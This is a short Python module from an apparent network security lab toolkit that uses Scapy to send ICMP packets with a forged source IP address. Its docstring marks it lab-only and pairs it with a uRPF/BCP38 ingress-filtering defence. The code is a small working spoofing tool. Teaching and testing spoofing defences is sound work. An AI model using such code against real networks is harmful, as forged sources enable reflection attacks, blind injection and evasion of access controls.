# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-ipspoof: emit a packet with a forged source IP. LAB ONLY.

Foundation of reflection, blind and ACL-evasion attacks. BCP38 ingress filtering
/ uRPF (see urpf.py) drops packets whose source cannot legitimately arrive on
the ingress interface.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    pkt = s.Ether() / s.IP(src=args.spoof_src, dst=args.dst) / s.ICMP()
    print(f"[*] sending {args.count} packets spoofing src {args.spoof_src} -> {args.dst}")
    s.sendp(pkt, iface=args.iface, count=args.count, verbose=0)
    verdict("ALERT", f"forged source {args.spoof_src}")
    return 0
